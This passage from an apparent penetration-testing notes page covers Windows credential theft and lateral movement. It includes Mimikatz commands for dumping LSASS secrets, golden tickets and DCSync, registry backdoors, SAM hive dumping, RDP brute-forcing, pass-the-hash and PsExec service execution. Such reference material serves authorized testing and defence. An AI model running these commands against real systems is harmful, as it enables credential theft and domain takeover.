<li><code class="codehilite"><span class="n">PsInfo</span></code> - Displays installation, install date, kernel build, physical memory, processors type and number, etc.</li>
<li><code class="codehilite"><span class="n">PsList</span></code> - Displays process, CPU, Memory, thread statistics</li>
<li><code class="codehilite"><span class="n">PsLoggedOn</span></code> - Displays local and remote logged users</li>
<li><code class="codehilite"><span class="n">PsLogList</span></code> - View Event logs</li>
</ul>
</li>
<li>localrecon.cmd: Utility to generate a summary of a Windows system: <a href="https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd">https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd</a></li>
<li>Empire: post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent: <a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></li>
<li>Seatbelt: C# project that performs a number of security oriented host-survey "safety checks": <a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></li>
</ul>
<h4 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">&para;</a></h4>
<ul>
<li>Mimikatz 2.0 - Golden Ticket Walkthrough: <a href="https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html">https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html</a></li>
<li>General commands:
    <div class="codehilite"><pre><span></span><span class="n">privilege</span><span class="o">::</span><span class="n">debug</span>

<span class="n">sekurlsa</span><span class="o">::</span><span class="n">logonPasswords</span> <span class="n">full</span>
<span class="n">sekurlsa</span><span class="o">::</span><span class="n">pth</span> <span class="o">/</span><span class="nl">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="o">/</span><span class="nl">domain</span><span class="p">:</span><span class="n">WOSHUB</span> <span class="o">/</span><span class="nl">ntlm</span><span class="p">:{</span><span class="n">NTLM_hash</span><span class="p">}</span> <span class="o">/</span><span class="nl">run</span><span class="p">:</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>

<span class="n">misc</span><span class="o">::</span><span class="n">skeleton</span>

<span class="n">ipconfig</span> <span class="o">/</span><span class="n">all</span>
<span class="n">whoami</span> <span class="o">/</span><span class="n">user</span>
<span class="n">lsadump</span><span class="o">::</span><span class="n">lsa</span> <span class="o">/</span><span class="n">inject</span> <span class="o">/</span><span class="nl">name</span><span class="p">:</span><span class="n">krbtgt</span>
<span class="n">kerbros</span><span class="o">::</span><span class="n">golden</span> <span class="o">/</span><span class="nl">domain</span><span class="p">:[</span><span class="n">Domain</span><span class="p">]</span> <span class="o">/</span><span class="nl">sid</span><span class="p">:[</span><span class="n">SID</span><span class="p">]</span> <span class="o">/</span><span class="nl">rc4</span><span class="p">:[</span><span class="n">NTLM</span> <span class="n">Hash</span><span class="p">]</span> <span class="o">/</span><span class="nl">user</span><span class="p">:[</span><span class="n">Username</span> <span class="n">To</span> <span class="n">Create</span><span class="p">]</span> <span class="o">/</span><span class="kt">id</span><span class="o">:</span><span class="mi">500</span> <span class="o">/</span><span class="n">ptt</span>
<span class="n">pushd</span> <span class="err">\\</span><span class="n">WINSERVER01</span><span class="err">\</span><span class="n">c</span><span class="err">$</span>
<span class="n">cd</span> <span class="n">WINDOWS</span><span class="err">\</span><span class="n">NTDS</span>
</pre></div></li>
<li>If WDigest is disabled: 
    <div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="k">add</span> <span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Control</span><span class="err">\</span><span class="n">SecurityProviders</span><span class="err">\</span><span class="n">WDigest</span> <span class="o">/</span><span class="n">v</span> <span class="n">UseLogonCredential</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">1</span>
</pre></div></li>
<li>Export memory dump and use it in Mimikatz:
    <div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">Process</span> <span class="n">lsass</span> <span class="o">|</span> <span class="k">Out</span><span class="o">-</span><span class="n">Minidump</span>
<span class="n">sekurlsa</span><span class="p">::</span><span class="n">minidump</span> <span class="n">lsass_592</span><span class="p">.</span><span class="n">dmp</span>
</pre></div></li>
<li>Using VMWare / Hibernate file: <a href="http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/">http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/</a></li>
<li>Mimikatz features: <a href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a></li>
<li>DCSync<ul>
<li><a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a>
  <div class="codehilite"><pre><span></span>mimikatz <span class="s2">&quot;lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt&quot;</span>
mimikatz <span class="s2">&quot;lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator&quot;</span>
</pre></div></li>
<li>"impersonates" a Domain Controller and requests account password data from the targeted Domain Controller.</li>
<li>Required Permissions: Any member of <code class="codehilite"><span class="n">Administrators</span></code>, <code class="codehilite"><span class="k">Domain</span> <span class="n">Admins</span></code>, or <code class="codehilite"><span class="n">Enterprise</span> <span class="n">Admins</span></code> as well as <code class="codehilite"><span class="k">Domain</span> <span class="n">Controller</span></code> computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default.</li>
<li>Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the <code class="codehilite"><span class="n">KRBTGT</span> <span class="n">password</span> <span class="n">hash</span></code> to create <code class="codehilite"><span class="n">Golden</span> <span class="n">Tickets</span></code></li>
<li>With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit).</li>
<li>Internals:<ul>
<li>Discovers Domain Controller in the specified domain name.</li>
<li>Requests the Domain Controller replicate the user credentials via <a href="https://wiki.samba.org/index.php/DRSUAPI">GetNCChanges</a> (leveraging Directory Replication Service (DRS) Remote Protocol)
<div class="codehilite"><pre><span></span><span class="s2">&quot;</span><span class="s">The client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client has to apply to its NC replica.</span>

<span class="nv">It</span> <span class="nv">is</span> <span class="nv">possible</span> <span class="nv">that</span> <span class="nv">the</span> <span class="nv">set</span> <span class="nv">of</span> <span class="nv">updates</span> <span class="nv">is</span> <span class="nv">too</span> <span class="nv">large</span> <span class="k">for</span> <span class="nv">only</span> <span class="nv">one</span> <span class="nv">response</span> <span class="nv">message</span>. <span class="nv">In</span> <span class="nv">those</span> <span class="nv">cases</span>, <span class="nv">multiple</span> <span class="nv">DSGetNCChanges</span> <span class="nv">requests</span> <span class="nv">and</span> <span class="nv">responses</span> <span class="nv">are</span> <span class="nv">done</span>. <span class="nv">This</span> <span class="nv">process</span> <span class="nv">is</span> <span class="nv">called</span> <span class="nv">replication</span> <span class="nv">cycle</span> <span class="nv">or</span> <span class="nv">simply</span> <span class="nv">cycle</span>.<span class="s2">&quot;</span>

<span class="s2">&quot;</span><span class="s">When a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored in RepsFrom data structure) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the DC’s which it replicates from.</span><span class="s2">&quot;</span>
</pre></div></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="psexec">PsExec<a class="headerlink" href="#psexec" title="Permanent link">&para;</a></h4>
<ul>
<li>References:<ul>
<li><a href="https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec">https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec</a></li>
<li><a href="https://www.toshellandback.com/2017/02/11/psexec/">https://www.toshellandback.com/2017/02/11/psexec/</a></li>
<li><a href="http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html">http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html</a></li>
</ul>
</li>
</ul>
<h3 id="important-endpoints">Important Endpoints<a class="headerlink" href="#important-endpoints" title="Permanent link">&para;</a></h3>
<ul>
<li>Connection endpoints for Windows 10: <a href="https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints">https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints</a></li>
</ul>
<h3 id="registry">Registry<a class="headerlink" href="#registry" title="Permanent link">&para;</a></h3>
<ul>
<li>Important Registry Locations<ul>
<li>Installed programs: <code class="codehilite"><span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Uninstall</span></code></li>
<li>Gain system shell at login using 5x[shift]:<ul>
<li><code class="codehilite"><span class="n">HKLM</span><span class="p">:</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Image</span> <span class="n">File</span> <span class="n">Execution</span> <span class="k">Options</span><span class="err">\</span><span class="n">sethc</span><span class="p">.</span><span class="n">exe</span></code> with property <code class="codehilite"><span class="n">Debugger</span></code> set to <code class="codehilite"><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span></code></li>
<li><code class="codehilite"><span class="n">HKLM</span><span class="p">:</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Image</span> <span class="n">File</span> <span class="n">Execution</span> <span class="k">Options</span><span class="err">\</span><span class="n">utilman</span><span class="p">.</span><span class="n">exe</span></code> with property <code class="codehilite"><span class="n">Debugger</span></code> set to <code class="codehilite"><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span></code></li>
<li>Disable macro security:</li>
</ul>
</li>
<li>Enable EDP: <code class="codehilite"><span class="n">reg</span> <span class="k">add</span> <span class="ss">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">fDenyTSConnections</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">0</span> <span class="o">/</span><span class="n">f</span></code></li>
</ul>
</li>
<li>Ways to access registry<ul>
<li>cmd: <code class="codehilite"><span class="n">cmd</span> <span class="o">/</span><span class="k">c</span> <span class="n">REG</span> <span class="n">QUERY</span></code></li>
<li>Powershell:<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Item</span> <span class="o">&lt;</span><span class="n">path</span><span class="o">&gt;</span></code></li>
<li>For remote use: <code class="codehilite"><span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span></code> and inside the session use <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Item</span></code></li>
</ul>
</li>
<li>WMI (StdRegProv)<ul>
<li>To find IDs use: <a href="https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1">https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1</a>
  <div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">RemoteReg</span> <span class="o">=</span> <span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="n">List</span> <span class="ss">&quot;StdRegProv&quot;</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Credential</span> <span class="o">&lt;</span><span class="n">cred</span><span class="o">&gt;</span>
<span class="err">$</span><span class="n">RemoteReg</span> <span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">methods</span> <span class="o">|</span> <span class="k">more</span>
<span class="err">$</span><span class="n">RemoteReg</span><span class="p">.</span><span class="n">getStringValue</span><span class="p">(</span><span class="o">&lt;</span><span class="n">id</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">path</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">propertyName</span><span class="o">&gt;</span><span class="p">)</span>
</pre></div></li>
</ul>
</li>
<li>.Net
  <div class="codehilite"><pre><span></span><span class="p">[</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">RegistryKey</span><span class="p">].</span><span class="n">getMethods</span><span class="p">()</span>
</pre></div></li>
<li><a href="https://archive.codeplex.com/?p=psremoteregistry">https://archive.codeplex.com/?p=psremoteregistry</a></li>
</ul>
</li>
<li>Tasks<ul>
<li>Recently used commands</li>
<li>Installed apps</li>
<li>Turn off network level auth</li>
<li>Attach debugger to setg.exe</li>
</ul>
</li>
</ul>
<h2 id="credentials">Credentials<a class="headerlink" href="#credentials" title="Permanent link">&para;</a></h2>
<ul>
<li>Cheatsheet: <a href="https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/credential-search.md">https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/credential-search.md</a></li>
<li>Stored Credentials<ul>
<li>Creates, lists, and deletes stored user names and passwords or credentials.</li>
<li>Usable with "runas /savecred"
  <div class="codehilite"><pre><span></span><span class="n">cmdkey</span> <span class="o">/</span><span class="n">list</span>
</pre></div></li>
</ul>
</li>
<li>LM hashes<ul>
<li>Password longer than 7 is split and each half hashed separately</li>
<li>Passwords are converted into uppercase</li>
<li>No salt</li>
<li>Empty LM hash
  <div class="codehilite"><pre><span></span><span class="n">AAD3B435B51404EE</span>
<span class="n">aad3b435b51404ee</span>
<span class="n">AAD3B435B51404EEAAD3B435B51404EE</span>
<span class="n">aad3b435b51404eeaad3b435b51404ee</span>
</pre></div></li>
</ul>
</li>
<li>NTLM hashes
    <div class="codehilite"><pre><span></span><span class="n">Administrator</span><span class="o">:</span><span class="mi">500</span><span class="o">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="o">:</span><span class="mi">8118</span><span class="n">cb8789b3a147c790db402b016a08</span><span class="o">:::</span>
<span class="o">(</span><span class="n">UID</span><span class="o">):(</span><span class="n">UID</span> <span class="n">NUM</span><span class="o">):(</span><span class="n">LM</span> <span class="n">HASH</span><span class="o">):(</span><span class="n">NT</span> <span class="n">HASH</span><span class="o">):(</span><span class="n">COMMENT</span><span class="o">):(</span><span class="n">USER</span> <span class="n">HOME</span> <span class="n">PATH</span><span class="o">):</span>
</pre></div></li>
<li>Dumping hashes<ul>
<li>Cannot copy SAM when sys is in use
<div class="codehilite"><pre><span></span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span> <span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="err">\</span><span class="n">sam</span> <span class="n">sam</span>
<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span> <span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="err">\</span><span class="k">security</span> <span class="k">security</span>
<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span> <span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="err">\</span><span class="k">system</span> <span class="k">system</span>
</pre></div></li>
<li>Use secretsdump.py to extract </li>
</ul>
</li>
<li>Capturing Hashes<ul>
<li>Inveigh</li>
<li>Impacket's smbserver.py</li>
</ul>
</li>
<li>RDP Password Brute-forcing: <code class="codehilite"><span class="n">ncrack</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">f</span> <span class="c1">--user administrator -P password.txt rdp://ip,CL=1</span></code></li>
<li>Attack Patterns<ul>
<li>Pass the Hash<ul>
<li>Auth using username and NTLM hash (since NTLM and LM hashes are not salted)<ul>
<li>Replace "no password" in dump wih empty LM hash</li>
<li>Copy admins dumped hash (LM:NTML)
<div class="codehilite"><pre><span></span><span class="n">export</span> <span class="n">SMBHASH</span><span class="o">=</span><span class="n">LM</span><span class="p">:</span><span class="n">NTML</span>
<span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">administrator</span><span class="o">%</span> <span class="o">//</span><span class="n">ip</span> <span class="n">cmd</span>
</pre></div></li>
</ul>
</li>
<li>pth-winexe
  <div class="codehilite"><pre><span></span><span class="n">pth</span><span class="o">-</span><span class="n">winexe</span>
<span class="o">-</span><span class="n">U</span> <span class="n">jeeves</span><span class="o">/</span><span class="n">Administrator</span><span class="o">%</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e0fb1fb85756c24235ff238cbe81fe00</span>
<span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">63</span> <span class="n">cmd</span>
</pre></div></li>
</ul>
</li>
<li>LSASS</li>
<li>DPAPI Backup Key<ul>
<li>Access to secret keys of all users in a domain (certificate, private key, etc.)</li>
<li>Obtaining the never changing DPAPI master key</li>
<li>In a domain setup, all master keys are required to decrypt the keys.<ul>
<li>All master keys are protected using  one never renewed  key.</li>
<li>Backup key protocol can be used (tz) to get this key from DC.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Skeleton Key</p>
<ul>
<li><a href="https://www.secureworks.com/research/skeleton-key-malware-analysis">https://www.secureworks.com/research/skeleton-key-malware-analysis</a></li>
<li>Actors can use a password of their choosing to authenticate as any user.</li>
<li>Skeleton Key is deployed as an in-memory patch on a victim's AD domain controllers to allow the threat actor to authenticate as any user, while legitimate users can continue to authenticate as normal.</li>
</ul>
<blockquote>
<p>When run, Skeleton Key performs the following tasks:</p>
<ol>
<li>Check for one of the following compatible 64-bit Windows versions. The malware is not compatible with 32-bit Windows versions or with Windows Server versions beginning with Windows Server 2012 (6.2).<ul>
<li>6.1 (Windows 2008 R2)</li>
<li>6.0 (Windows Server 2008)</li>
<li>5.2 (Windows 2003 R2)</li>
</ul>
</li>
<li>Use the SeDebugPrivilege function to acquire the necessary administrator privileges to write to the Local Security Authority Subsystem Service (LSASS) process. This process controls security functions for the AD domain, including user account authentication.</li>
<li>Enumerate available processes to acquire a handle to the LSASS process.</li>
<li>Obtain addresses for the authentication-related functions that will be patched:<ul>
<li>CDLocateCSystem — located in cryptdll.dll</li>
<li>SamIRetrieveMultiplePrimaryCredentials — located in samsrv.dll</li>
<li>SamIRetrievePrimaryCredentials — located in samsrv.dll</li>
</ul>
</li>
<li>Perform OS-specific adjustments using the global variable set during the compatibility check in Step 1.</li>
<li>Use the OpenProcess function to acquire a handle to the LSASS process.</li>
<li>Reserve and allocate the required memory space to edit and patch the LSASS process's memory.</li>
<li>Patch relevant functions based on the operating system:<ul>
<li>CDLocateCSystem (all compatible Windows versions)</li>
<li>SamIRetrieveMultiplePrimaryCredentials (only Windows 2008 R2 (6.1))</li>
<li>SamIRetrievePrimaryCredentials (all compatible Windows versions other than Windows 2008 R2 (6.1))</li>
</ul>
</li>
</ol>
<p>Skeleton Key performs the following steps to patch each function:</p>
<ol>
<li>Call the VirtualProtectEx function to change the memory protection to allow writing to the required memory allocations (PAGE_EXECUTE_READWRITE, 0x40). This step allows the function's code to be updated in memory.</li>
<li>Call the WriteProcessMemory function to change the address of the target function to point to the patched code. This change causes calls to the target function to use the patch instead.</li>
<li>Restore the original memory protection by calling VirtualProtectEx with the original memory protection flags. This step is likely to avoid suspicious writable and executable memory allocations.<ul>
<li>Manipulating SID</li>
<li>sidHistory can be used to manipulate SID and become domain admin</li>
<li>Use SID of the DC to look ad domain admin</li>
<li>Use DCSync to get more information  </li>
<li>Windows Version Dependent Information</li>
<li>Windows 2000</li>
<li>LSASS contains</li>
<li>Plain NTLM / LM hashes</li>
<li>Kerberos keys, tickets, session keys, passwords (if not consumed already)</li>
<li>Passwords encrypted in memory using 1 byte key (XOR)</li>
<li>Key is stored in a secret structure</li>
<li>[Tool] MimiLove (not in Mimikatz )</li>
<li>Windows XP/2003</li>
<li>WDigest provider to auth to Web/SASL/LDAP - RFC2617</li>
<li>Password constantly stays in memory</li>
<li>LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory</li>
<li>RC4 DESx</li>
<li>Key and IV are stored near the secret in LSASS process</li>
<li>TsPks (CredSSP) provider can be added manually in XP</li>
<li>Terminal server single sign on</li>
<li>Credential delegation for terminal server/PowerShell/Double hop, etc.</li>
<li>LiveSSP - For using live account to logon to windows</li>
<li>Windows Vista/7</li>
<li>TsPkg (CredSSP support) is available by default</li>
<li>Several passwords are constantly in memory</li>
<li>LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory</li>
<li>3DES AES</li>
<li>Key and IV are stored near the secret in LSASS process</li>
<li>Windows 8/8.1</li>
<li>Clear text domain passwords in Vault</li>
<li>When using PIN, Picture or Fingerprint to authenticate</li>
<li>Offline access is possible</li>
<li>Pass the hash, over pass the hash and pass the ticket for RDP</li>
<li>Windows 8.1</li>
<li>WDigest is off by default.</li>
<li>No password in memory by default.</li>
<li>LSA login session cache cleaner</li>
<li>Restricted admin mode for RDP</li>
<li>Avoid credentials from getting sent to server</li>
<li>Pass the hash, over pass the hash and pass the ticket for RDP (with CredSSP)</li>
<li>LSA protection</li>
<li>LSASS is a protected process. No memory access provided.</li>
<li>Can be bypassed by:</li>
<li>A driver</li>
<li>Another protected process</li>
<li>Protected Users security group</li>
<li>No NTLM, WDigest, CredSSP, delegation or SSO</li>
<li>Strengthen eKerberos only</li>
<li>KB2975625 - Restricted admin is disabled by default</li>
<li>Windows 10</li>
<li>VMS introduce for enterprise users</li>
<li>Use Crypto HSM approach</li>
<li>When Windows Credential Guard is enabled:</li>
<li>NTLM hash of the password stored in the memory in "secure world", encrypted with a "session-key".</li>
<li>User will get a blob.</li>
<li>When authenticating, user sends the blob with NTLM challenge.</li>
<li>Secure world will do the hashing operation and create the NTML challenge response and send the response to the normal world.</li>
<li>In Kerberos, process is same (secure-world maintain more keys)</li>
<li>Limitations<ul>
<li>TGS session key is not protected (TGT is protected)</li>
<li>Not available in VMs and not enabled by default</li>
</ul>
</li>
<li>More to protect:<ul>
<li>DPAPI</li>
<li>SAM / DSRM</li>
<li>PAC signature</li>
</ul>
</li>
<li>References</li>
<li>Extracting User Password Data with Mimikatz DCSync: <a href="https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/">https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/</a></li>
</ul>
</li>
</ol>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="using-credentials">Using Credentials<a class="headerlink" href="#using-credentials" title="Permanent link">&para;</a></h2>
<ul>
<li>References<ul>
<li><a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">https://blog.ropnop.com/using-credentials-to-own-windows-boxes/</a></li>
</ul>
</li>
<li>Password Spraying<ul>
<li><code class="codehilite"><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_login</span></code></li>
<li>Send the same credentials to all hosts listening on 445
    - <code class="codehilite"><span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">smb_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">445</span> <span class="o">-</span><span class="n">R</span></code></li>
<li>Can do same with <code class="codehilite"><span class="n">CrackMapExec</span></code> for a subnet: <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li>
<li>Can use following command to explore:
<div class="codehilite"><pre><span></span><span class="n">net</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="err">\\</span><span class="n">machine</span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="o">/</span><span class="k">user</span><span class="err">:</span><span class="n">username</span><span class="nv">@domainname</span><span class="w"> </span><span class="n">passwords</span><span class="w"></span>
<span class="n">dir</span><span class="w"> </span><span class="err">\\</span><span class="n">machine</span><span class="o">-</span><span class="n">name</span><span class="err">\</span><span class="n">c</span><span class="err">$</span><span class="w"></span>
<span class="n">net</span><span class="w"> </span><span class="k">use</span><span class="w"></span>
</pre></div></li>
<li>Can be detected by using <code class="codehilite"><span class="n">net</span> <span class="k">session</span></code></li>
<li>Can terminate all session with <code class="codehilite"><span class="n">net</span> <span class="n">use</span> <span class="o">/</span><span class="k">delete</span> <span class="o">*</span></code></li>
<li>Some commands, such as <code class="codehilite"><span class="n">net</span> <span class="k">view</span></code> use the login user-name. .: use <code class="codehilite"><span class="n">runas</span></code>
<div class="codehilite"><pre><span></span><span class="n">runas</span><span class="w"> </span><span class="o">/</span><span class="n">netonly</span><span class="w"> </span><span class="o">/</span><span class="k">user</span><span class="err">:</span><span class="k">user</span><span class="nv">@domainname</span><span class="w"> </span><span class="ss">&quot;cmd.exe&quot;</span><span class="w"></span>
<span class="n">net</span><span class="w"> </span><span class="k">view</span><span class="w"> </span><span class="err">\\</span><span class="n">machine</span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="o">/</span><span class="ow">all</span><span class="w"></span>
</pre></div></li>
<li>Verify it uses Kerberos by <code class="codehilite"><span class="n">klist</span></code></li>
</ul>
</li>
<li>Get shells</li>
<li>psexec<ul>
<li>PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software</li>
<li><code class="codehilite"><span class="n">auxiliary</span><span class="o">/</span><span class="k">admin</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span></code></li>
<li><code class="codehilite"><span class="n">auxiliary</span><span class="o">/</span><span class="k">admin</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec_comman</span></code></li>
<li>psexec.py - <a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a>
  <div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">impacket</span><span class="o">/</span><span class="n">examples</span><span class="o">/</span><span class="n">psexec</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">9</span><span class="n">e730375b7cbcebf74ae46481e07b0c7</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="err">\\</span><span class="n">machinename</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="k">user</span><span class="nv">@domainname</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="w"></span>
</pre></div></li>
<li><code class="codehilite"><span class="o">-</span><span class="n">s</span></code> to get <code class="codehilite"><span class="k">SYSTEM</span></code> shell</li>
<li>Use runas to use Kerberos TGT and avoid giving password:
  <div class="codehilite"><pre><span></span><span class="n">runas</span><span class="w"> </span><span class="o">/</span><span class="n">netonly</span><span class="w"> </span><span class="o">/</span><span class="k">user</span><span class="err">:</span><span class="k">user</span><span class="nv">@domainname</span><span class="w"> </span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="err">\\</span><span class="n">machinename</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="k">user</span><span class="nv">@domainname</span><span class="w">  </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="w"></span>
</pre></div></li>
<li>Manual Operation<ul>
<li>Copy a binary to the ADMIN$ share over SMB (<code class="codehilite"><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">PSEXECSVC</span><span class="p">.</span><span class="n">exe</span><span class="p">.</span></code>)
    - <code class="codehilite"><span class="k">copy</span> <span class="n">example</span><span class="p">.</span><span class="n">exe</span> <span class="err">\\</span><span class="n">machine</span><span class="err">\</span><span class="k">ADMIN</span><span class="err">$</span></code></li>
<li>Create a service on the remote matching pointing to the binary
    - <code class="codehilite"><span class="n">sc</span> <span class="err">\\</span><span class="n">machine</span> <span class="k">create</span> <span class="n">serviceName</span> <span class="n">binPath</span><span class="o">=</span><span class="ss">&quot;c:\Windows\example.exe&quot;</span></code></li>
<li>Remotely start the service
    - <code class="codehilite"><span class="n">sc</span> <span class="err">\\</span><span class="n">machine</span> <span class="k">start</span> <span class="n">serviceName</span></code></li>
<li>When exited, stop the service and delete the binary
    - <code class="codehilite"><span class="n">del</span> <span class="err">\\</span><span class="n">machine</span><span class="err">\</span><span class="k">ADMIN</span><span class="err">$\</span><span class="n">example</span><span class="p">.</span><span class="n">exe</span></code></li>
</ul>
</li>
</ul>
</li>
<li>smbexec.pp<ul>
<li>Stealthier (does not drop a binary)</li>
<li>Creates a service</li>
<li>Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe)</li>
<li>Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it.</li>
<li>Creates a log entry for each command.
